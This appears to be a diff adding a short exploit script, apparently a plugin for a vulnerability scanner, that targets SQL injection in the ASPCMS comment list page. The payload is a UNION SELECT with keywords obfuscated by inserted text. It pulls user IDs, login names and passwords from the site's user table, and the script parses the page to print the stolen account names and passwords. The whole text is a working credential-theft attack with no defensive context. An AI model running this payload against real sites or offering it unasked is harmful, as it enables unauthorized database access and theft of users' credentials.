@@ -1,0 +1,18 @@
+#request url = var
+#define payload = /plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user
+#define bug =  200 OK
+#define info = aspcms_sql注入
+#define qian = <div class="line2">
+#define hou = </div>
+#define qiant = 评论者：
+#define hout =  IP：
+
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[1],bug,0)!= "-1")
+	{
+		print(url.info,"账号:".GettextMiddle(res[0],qiant,hout),"密码:".GettextMiddle(res[0],qian,hou));
+	}
+}
